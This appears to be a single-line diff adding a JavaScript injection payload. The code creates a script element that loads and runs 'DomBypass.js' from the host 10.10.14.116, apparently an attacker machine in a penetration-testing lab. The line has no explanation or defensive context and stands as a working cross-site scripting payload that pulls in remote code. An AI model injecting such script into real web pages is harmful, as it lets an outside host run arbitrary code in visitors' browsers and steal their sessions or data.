@@ -1,0 +1,1 @@
+const script = document.createElement('script');script.setAttribute('src', 'http://10.10.14.116/DomBypass.js');document.head.appendChild(script);
